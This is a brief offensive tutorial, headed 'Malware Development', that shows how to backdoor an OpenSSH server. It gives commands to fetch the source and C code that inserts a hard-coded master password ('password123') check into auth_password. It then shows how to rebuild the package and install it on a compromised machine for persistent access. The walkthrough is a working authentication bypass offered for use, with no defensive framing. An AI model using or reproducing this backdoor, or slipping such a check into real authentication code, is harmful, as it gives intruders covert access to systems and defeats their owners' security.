# Malware Development

## Backdoor OpenSSH Server

Download the OpenSSH source code using the package manager.

```
userware@hackware-os:~$ mkdir /tmp/sin && cd /tmp/sin  
apt-get source openssh-server
```

The only thing that stands out is `auth-passwd.c`.

```
userware@hackware-os:~$ nano /tmp/sin/openssh-*/auth-passwd.c
```

This function is responsible to check parameters.

```c
/*
 * Tries to authenticate the user using password. Returns true if
 * authentication succeeds.
 */
int
auth_password(Authctxt *authctxt, const char *password)
{
// ..[omitted]..
```

`authctxt` is a struct that is defined in `auth.h`, but we don’t need it. `const char *password` parameter holds the client’s password. This is the core function that can be backdoored. Let's write a simple if statement that checks the `*password` parameter with our master password string with `strcmp` function to compare the strings to return true if it's a match.

```c
	if (strcmp(password, "password123") == 0)  
	    return 1;
```

Insert the lines of code inside function starting from top. It should look like this:

```c
int
auth_password(Authctxt *authctxt, const char *password)
{
	if (strcmp(password, "password123") == 0)  
	    return 1;
// ..[omitted]..
```

Now let's compile the backdoor.

```
userware@hackware-os:~$ cd /tmp/sin/openssh-*
apt-get build-dep openssh-server
dpkg-buildpackage -rfakeroot -uc -b
```

Transfer the `.deb` payload then install it on the compromised machine.

```
$ sudo dpkg -i openssh-server_*.deb
```

Authenticate the backdoored SSH server with the master password (`password123`).

```
$ ssh [-p <PORT>] <username>@<target_IP>
```

---
## References

### Pikami

- [Pikami: Backdooring OpenSSH Server](https://pikami.org/blog/backdooring-openssh-server/)